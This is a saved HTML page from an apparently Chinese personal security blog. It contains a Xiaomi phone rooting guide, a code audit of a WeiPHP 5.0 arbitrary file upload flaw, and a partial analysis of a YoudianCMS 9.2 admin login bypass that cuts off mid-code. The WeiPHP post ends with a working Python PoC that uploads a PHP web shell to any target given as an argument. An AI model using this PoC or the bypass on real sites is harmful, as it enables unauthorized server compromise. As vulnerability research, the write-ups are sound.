<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  

  
  <title>闪电&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  
  
  <meta property="og:type" content="website">
<meta property="og:title" content="闪电&#39;s Blog">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="闪电&#39;s Blog">
<meta property="og:locale" content="en">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="闪电&#39;s Blog">
  
    <link rel="alternate" href="/atom.xml" title="闪电&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/images/default-avatar.jpg">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/css/highlight.css">
</head>
</html>
<body>
  <div id="fullpage" class="mobile-nav-right">
    
      <div id="wrapper" title="图片来自网络">
    
    
      <header id="header">
  <div id="nav-toggle" class="nav-toggle"></div>
  <div class="head-box global-width">
    <nav class="nav-box nav-right">
      
        <a class="nav-item" href="/" title
        
        >首页</a>
      
        <a class="nav-item" href="/archives" title
        
        >归档</a>
      
    </nav>
  </div>
</header>
      <div id="middlecontent" title class="global-width sidebar-right">
        <section id="main">
  
    <article id="post-小米手机root" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/07/01/小米手机root/">小米手机root</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2021/07/01/小米手机root/" class="article-date">
  <time datetime="2021-07-01T08:36:20.000Z" itemprop="datePublished">2021-07-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/杂记/">杂记</a>
  </div>

    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <h1 id="小米手机ROOT"><a href="#小米手机ROOT" class="headerlink" title="小米手机ROOT"></a>小米手机ROOT</h1><p>有一部小米8的旧手机，想给他root，用来日常抓包或者装个kali玩玩。不得不说小米root起来真的比其他手机简单多了，还提供了官方解锁通道。这里记录一下root过程中遇到的问题及解决方法。</p>
<p>手机：小米8</p>
<p>当前版本：miui12.x</p>
<h3 id="首先解锁Bootloader"><a href="#首先解锁Bootloader" class="headerlink" title="首先解锁Bootloader"></a>首先解锁Bootloader</h3><p>解锁申请连接，下载解锁工具，根据提示一键解锁</p>
<p><a href="http://www.miui.com/unlock/index.html" target="_blank" rel="noopener">http://www.miui.com/unlock/index.html</a></p>
<p><img src="/images/Article_images/Clip_20210701_155748.png" alt="Clip_20210701_155748"></p>
<p>查看 是否解锁</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.开启 开发者模式</span><br><span class="line">我的设备-&gt;全部参数-&gt;一直点击miui版本</span><br><span class="line">2.查看</span><br><span class="line">更多设置-&gt;开发者选项-&gt;设备解锁状态</span><br></pre></td></tr></table></figure></div>

<p><img src="/images/Article_images/Clip_20210701_160234.png" alt="Clip_20210701_160234"></p>
<h3 id="刷开发版系统"><a href="#刷开发版系统" class="headerlink" title="刷开发版系统"></a>刷开发版系统</h3><p>稳定版系统,应用设置里没看到开启root的，应该不支持，所以这里要刷开发版系统</p>
<p>开发版系统下载<a href="https://www.miui.com/download.html" target="_blank" rel="noopener">https://www.miui.com/download.html</a></p>
<p>我是小米八，在这里下载<a href="http://www.miui.com/download-345.html" target="_blank" rel="noopener">http://www.miui.com/download-345.html</a></p>
<p><img src="/images/Article_images/Clip_20210701_160603.png" alt="Clip_20210701_160603"></p>
<p>下载开发版系统，将系统包移到内部存储下。</p>
<p>我的设备-&gt;miui版本-&gt;手动选择安装包(右上角三点，没有手动也没事，一直点击miui的logo，然后会有提示，这时候就会出现手动安装) </p>
<p>这里遇到一个坑，就是我当前miui版本太高了，以至于卡刷的时候提示</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该rom安全补丁低于当前版本</span><br></pre></td></tr></table></figure></div>

<p>所以下一步就是去降低当前miui的版本，我是直接降到了十点几。但是这时候问题来了，miui官网不支持下载miui历史版本的线刷包，问了客服，客服说现在不支持下载历史版本。最后在网上找到了一个下载历史版本下载的网站 [历史版本] (<a href="https://miuiver.com/" target="_blank" rel="noopener">https://miuiver.com/</a>)  ， 不过这里要想下载系统需要积分，一积分一块钱，签到一天一个积分。感觉还可以，遂花了两块钱，下了个线刷包的系统， <a href="https://bigota.d.miui.com/V10.3.5.0.PEACNXM/dipper_images_V10.3.5.0.PEACNXM_20190802.0000.00_9.0_cn_76d8c9a318.tgz" target="_blank" rel="noopener">https://bigota.d.miui.com/V10.3.5.0.PEACNXM/dipper_images_V10.3.5.0.PEACNXM_20190802.0000.00_9.0_cn_76d8c9a318.tgz</a></p>
<p><img src="/images/Article_images/Clip_20210701_161658.png" alt="Clip_20210701_161658"></p>
<p>还有一个网站，是专门用来存各种网站缓存的<a href="http://web.archive.org/" target="_blank" rel="noopener">http://web.archive.org/</a>   这里可以找到历史包，这是后来才发现的，平时信息收集的时候感觉可以利用一波，先记下来。</p>
<p>线刷工具<a href="http://bigota.d.miui.com/tools/MiFlash2018-5-28-0.zip" target="_blank" rel="noopener">http://bigota.d.miui.com/tools/MiFlash2018-5-28-0.zip</a></p>
<ol>
<li><p>解压刚刚下载的系统</p>
<p><img src="/images/Article_images/Clip_20210701_162332.png" alt="Clip_20210701_162332"></p>
</li>
<li><p>手机进入fastboot模式（音量下 + 电源键）</p>
</li>
<li><p>usb连接电脑</p>
</li>
<li><p>加载设备，并选择系统包</p>
<p><img src="/images/Article_images/Clip_20210701_162516.png" alt="Clip_20210701_162516"></p>
</li>
</ol>
<p>降低miui版本之后，再去解锁bootloader，解锁成功之后，再去将开发版的包移到手机上的内部存储</p>
<p><a href="http://www.miui.com/download-345.html" target="_blank" rel="noopener">http://www.miui.com/download-345.html</a></p>
<p>最后手动选择安装包。安装完成开发版系统之后，即可设置root</p>
<p>应用设置-&gt;授权管理</p>
<p><img src="/images/Article_images/Clip_20210701_163123.png" alt="Clip_20210701_163123"></p>
<p><img src="/images/Article_images/Clip_20210701_163239.png" alt="Clip_20210701_163239"></p>
<p>可以为所欲为了，嘿嘿嘿~</p>

      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-Weiphp5-0任意文件上传" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/06/30/Weiphp5-0任意文件上传/">Weiphp5.0任意文件上传</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2021/06/30/Weiphp5-0任意文件上传/" class="article-date">
  <time datetime="2021-06-30T06:45:08.000Z" itemprop="datePublished">2021-06-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/WEB相关/">WEB相关</a>
  </div>

    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <p>application\common.php</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_files</span><span class="params">($setting = <span class="string">''</span>, $driver = <span class="string">''</span>, $config = <span class="string">''</span>, $type = <span class="string">'picture'</span>, $isTest = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($return[<span class="string">'msg'</span>])) &#123;</span><br><span class="line">        <span class="comment">//判断扩展名是不是php,不支持上传php文件</span></span><br><span class="line">        $info = $file-&gt;getInfo();</span><br><span class="line">        $info = pathinfo($info[<span class="string">'name'</span>]);</span><br><span class="line">        <span class="comment">//这里判断后缀是否为php，可以加空格绕过</span></span><br><span class="line">        <span class="keyword">if</span> (strtolower($info[<span class="string">'extension'</span>]) == <span class="string">'php'</span>) &#123;</span><br><span class="line">            $return[<span class="string">'msg'</span>] = <span class="string">'不支持上传该文件类型'</span>;</span><br><span class="line">            $return[<span class="string">'code'</span>] = <span class="number">0</span>;</span><br><span class="line">            $redata[$key] = $return;</span><br><span class="line">            <span class="keyword">return</span> $redata;</span><br><span class="line">        &#125;</span><br><span class="line">        $checkRule = [];</span><br><span class="line">        <span class="keyword">if</span> ($type == <span class="string">'picture'</span>) &#123;</span><br><span class="line">            <span class="comment">//图片扩展名验证 ，图片大小不超过20M</span></span><br><span class="line">            $checkRule[<span class="string">'ext'</span>] = <span class="string">'gif,jpg,jpeg,png,bmp'</span>;</span><br><span class="line">            $checkRule[<span class="string">'size'</span>] = <span class="number">20971520</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $allowExt = input(<span class="string">'allow_file_ext'</span>, <span class="string">''</span>);</span><br><span class="line">            <span class="keyword">if</span> ($allowExt != <span class="string">''</span>) &#123;</span><br><span class="line">                $checkRule[<span class="string">'ext'</span>] = $allowExt;</span><br><span class="line">            &#125;</span><br><span class="line">            $allowSize = input(<span class="string">'allow_file_maxsize'</span>, <span class="string">''</span>);</span><br><span class="line">            <span class="keyword">if</span> ($allowSize &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                $checkRule[<span class="string">'size'</span>] = $allowSize;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $info = $file-&gt;isTest($isTest)</span><br><span class="line">            -&gt;rule(<span class="string">'uniqid'</span>)</span><br><span class="line">            -&gt;validate($checkRule)</span><br><span class="line">            -&gt;move($rootpath, DIRECTORY_SEPARATOR . $saveName);</span><br><span class="line">		...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里$type==’picture’，后面有个调用这个方法的，然后$type==’download’ 绕过了这个限制</p>
<p>application\home\model\File.php</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($setting = [], $driver = <span class="string">'Local'</span>, $config = null, $isTest = false)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">/* 上传文件 */</span></span><br><span class="line">       $setting[<span class="string">'callback'</span>] = <span class="keyword">array</span>(</span><br><span class="line">           <span class="keyword">$this</span>,</span><br><span class="line">           <span class="string">'isFile'</span></span><br><span class="line">       );</span><br><span class="line">       </span><br><span class="line">       $info = upload_files($setting, $driver, $config, <span class="string">'download'</span>, $isTest);</span><br><span class="line">    ...</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>application\home\controller\File.php    这里找到了调用upload</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">   	<span class="comment">//用户登录检测</span></span><br><span class="line">   	<span class="keyword">if</span> (!is_login())&#123;</span><br><span class="line">   		$return = <span class="keyword">array</span>(</span><br><span class="line">   				<span class="string">'status'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">   				<span class="string">'code'</span>=&gt;<span class="number">0</span>,</span><br><span class="line">   				<span class="string">'info'</span> =&gt; <span class="string">'上传失败，请先登录'</span>,</span><br><span class="line">   				<span class="string">'msg'</span> =&gt; <span class="string">'上传失败，请先登录'</span>,</span><br><span class="line">   				<span class="string">'data'</span> =&gt; <span class="string">''</span></span><br><span class="line">   		);</span><br><span class="line">   		<span class="keyword">return</span> json_encode($return);</span><br><span class="line">   	&#125;</span><br><span class="line">       $return = <span class="keyword">array</span>(</span><br><span class="line">           <span class="string">'status'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">           <span class="string">'info'</span> =&gt; <span class="string">'上传成功'</span>,</span><br><span class="line">           <span class="string">'data'</span> =&gt; <span class="string">''</span></span><br><span class="line">       );</span><br><span class="line">       <span class="comment">/* 调用文件上传组件上传文件 */</span></span><br><span class="line">       $File = D(<span class="string">'home/File'</span>);</span><br><span class="line">       $file_driver = strtolower(config(<span class="string">'picture_upload_driver'</span>));</span><br><span class="line">       $info = $File-&gt;upload(config(<span class="string">'download_upload'</span>), config(<span class="string">'picture_upload_driver'</span>), config(<span class="string">"upload_&#123;$file_driver&#125;_config"</span>));</span><br><span class="line">       <span class="comment">/* 记录附件信息 */</span></span><br><span class="line">       <span class="keyword">if</span> ($info) &#123;</span><br><span class="line">           $return[<span class="string">'code'</span>] = $return[<span class="string">'status'</span>] = <span class="number">1</span>;</span><br><span class="line">           $return = array_merge($info[<span class="string">'download'</span>], $return);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           $return[<span class="string">'code'</span>] = $return[<span class="string">'status'</span>] = <span class="number">0</span>;</span><br><span class="line">           $return[<span class="string">'msg'</span>] = $return[<span class="string">'info'</span>] = $File-&gt;getError();</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">/* 返回JSON数据 */</span></span><br><span class="line">       <span class="keyword">return</span> json_encode($return);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>构造上传.经测试，php7是不成功的，只能在php5下利用成功</p>
<p><img src="/images/Article_images/Clip_20210630_144156.png" alt="Clip_20210630_144156"></p>
<p>poc</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(target)</span>:</span></span><br><span class="line">	vul=target+<span class="string">'/public/index.php/home/File/upload_root'</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		files=&#123;</span><br><span class="line">		<span class="string">'download'</span>:(<span class="string">'1ight0.php '</span>,open(<span class="string">'shell.php'</span>,<span class="string">'rb'</span>),<span class="string">'image/png'</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		res=requests.post(url=vul,files=files,timeout=<span class="number">3</span>,verify=<span class="literal">False</span>).text</span><br><span class="line">		jsonres=json.loads(res)</span><br><span class="line">		shellpath=target+<span class="string">'/public/uploads/download'</span>+jsonres[<span class="string">'savepath'</span>]+jsonres[<span class="string">'savename'</span>].strip()</span><br><span class="line">		<span class="keyword">if</span> requests.get(url=shellpath,timeout=<span class="number">3</span>,verify=<span class="literal">False</span>).status_code == <span class="number">200</span>:</span><br><span class="line">			print(<span class="string">'shell-----&gt; '</span>,shellpath)</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'目标不存在漏洞'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		target=sys.argv[<span class="number">1</span>]</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'http'</span> <span class="keyword">not</span> <span class="keyword">in</span> target:</span><br><span class="line">			target=<span class="string">'http://'</span>+target</span><br><span class="line">		poc(target)</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'python poc.py 目标'</span>)</span><br></pre></td></tr></table></figure></div>

<p><img src="/images/Article_images/Clip_20210630_144355.png" alt="Clip_20210630_144355"></p>

      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-9-2后台登录绕过" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/06/28/9-2后台登录绕过/">youdiancms9.2后台登录绕过&#39;</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2021/06/28/9-2后台登录绕过/" class="article-date">
  <time datetime="2021-06-28T12:08:20.000Z" itemprop="datePublished">2021-06-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/WEB相关/">WEB相关</a>
  </div>

    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <ul>
<li>buildImageVerify里可设置session</li>
<li>AdminGroupiD=1即为超级管理员</li>
</ul>
<h3 id="检查后台是否登录，并鉴权"><a href="#检查后台是否登录，并鉴权" class="headerlink" title="检查后台是否登录，并鉴权"></a>检查后台是否登录，并鉴权</h3><p>App\Lib\Action\AdminBaseAction.class.php</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_initialize</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$mName = strtolower(ACTION_NAME);</span><br><span class="line">		$NoCheckAction = <span class="keyword">array</span>(<span class="string">'login'</span>, <span class="string">'verify'</span>,<span class="string">'checklogin'</span>,<span class="string">'showcode'</span>,<span class="string">'logout'</span>); <span class="comment">//免登录验证模块</span></span><br><span class="line">		<span class="keyword">if</span>( !<span class="keyword">$this</span>-&gt;isLogin() &amp;&amp; !in_array($mName, $NoCheckAction))&#123; <span class="comment">//没有登录，将返回登录页面</span></span><br><span class="line">		    <span class="keyword">$this</span>-&gt;_checkAjaxRequest();</span><br><span class="line">			<span class="keyword">$this</span>-&gt;redirect(<span class="string">"Public/login"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>( !<span class="keyword">$this</span>-&gt;checkPurview() )&#123; <span class="comment">//没有登录，将返回网站首页</span></span><br><span class="line">			<span class="keyword">$this</span>-&gt;redirect(<span class="string">"Public/welcome"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></div>

<p>跟进isLogin和checkPurview</p>
<p>isLogin很简单，就只是检查了是否有?AdminID和?AdminIDName</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isLogin</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$b = session(<span class="string">"?AdminID"</span>) &amp;&amp; session(<span class="string">"?AdminName"</span>);</span><br><span class="line">	<span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>checkPurview,这里检查$gid是否为1来鉴权。根据php的弱类型，只要上面的那个md5值的字符串第一位为1即可return true</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php弱类型</span><br><span class="line">var_dump(<span class="string">'1test'</span>==<span class="number">1</span>) <span class="comment">//true</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkPurview</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$gid = session(<span class="string">'AdminGroupID'</span>);</span><br><span class="line">		<span class="keyword">if</span>( $gid == <span class="number">1</span> ) <span class="keyword">return</span> <span class="keyword">true</span>;  <span class="comment">//超级管理员拥有所有权限</span></span><br><span class="line">	...</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="控制session"><a href="#控制session" class="headerlink" title="控制session"></a>控制session</h3><p>BaseAction.class.php中</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verifyCode</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$length = $_GET[<span class="string">'length'</span>];        <span class="comment">//长度</span></span><br><span class="line">	$mode = $_GET[<span class="string">'mode'</span>];          <span class="comment">//模式</span></span><br><span class="line">	$type = $_GET[<span class="string">'type'</span>];              <span class="comment">//图像类型</span></span><br><span class="line">	$width = $_GET[<span class="string">'width'</span>];           <span class="comment">//宽度</span></span><br><span class="line">	$height = $_GET[<span class="string">'height'</span>];        <span class="comment">//高度</span></span><br><span class="line">	$verifyName = $_GET[<span class="string">'verify'</span>];  <span class="comment">//验证码session名称</span></span><br><span class="line">	import(<span class="string">"ORG.Util.Image"</span>);</span><br><span class="line">	Image::buildImageVerify($length, $mode, $type, $width, $height, $verifyName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>跟进buildImageVerify中</p>
<p>$verifyName可控，该session的值是randString产生的随机字符的md5，而randString($length, $mode)中的参数也是可控的，跟进randString看看</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">buildImageVerify</span><span class="params">($length=<span class="number">4</span>, $mode=<span class="number">1</span>, $type=<span class="string">'png'</span>, $width=<span class="number">48</span>, $height=<span class="number">22</span>, $verifyName=<span class="string">'verify'</span>)</span> </span>&#123;</span><br><span class="line">        import(<span class="string">'ORG.Util.StringEx'</span>);</span><br><span class="line">        $randval = StringEx::randString($length, $mode);</span><br><span class="line">        $_SESSION[$verifyName] = md5($randval);</span><br><span class="line">		...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>App\Core\Extend\Library\ORG\Util\StringEx.class.php</p>
<p>为了让session进一步可控，将len设置为2，type为1，这些参数都是前面verifyCode中可控的</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">randString</span><span class="params">($len=<span class="number">6</span>,$type=<span class="string">''</span>,$addChars=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">	$str =<span class="string">''</span>;</span><br><span class="line">	<span class="keyword">switch</span>($type) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">			$chars=<span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'</span>.$addChars;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			$chars= str_repeat(<span class="string">'0123456789'</span>,<span class="number">3</span>);</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">			;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			$chars=<span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>.$addChars;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			$chars=<span class="string">'abcdefghijklmnopqrstuvwxyz'</span>.$addChars;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			$chars = <span class="string">"们以我..."</span>.$addChars;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span> :</span><br><span class="line">			<span class="comment">// 默认去掉了容易混淆的字符oOLl和数字01，要添加请使用addChars参数</span></span><br><span class="line">			$chars=<span class="string">'ABCDEFGHIJKMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789'</span>.$addChars;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($len&gt;<span class="number">10</span> ) &#123;<span class="comment">//位数过长重复字符串一定次数</span></span><br><span class="line">		$chars= $type==<span class="number">1</span>? str_repeat($chars,$len) : str_repeat($chars,<span class="number">5</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($type!=<span class="number">4</span>) &#123;</span><br><span class="line">		$chars   =   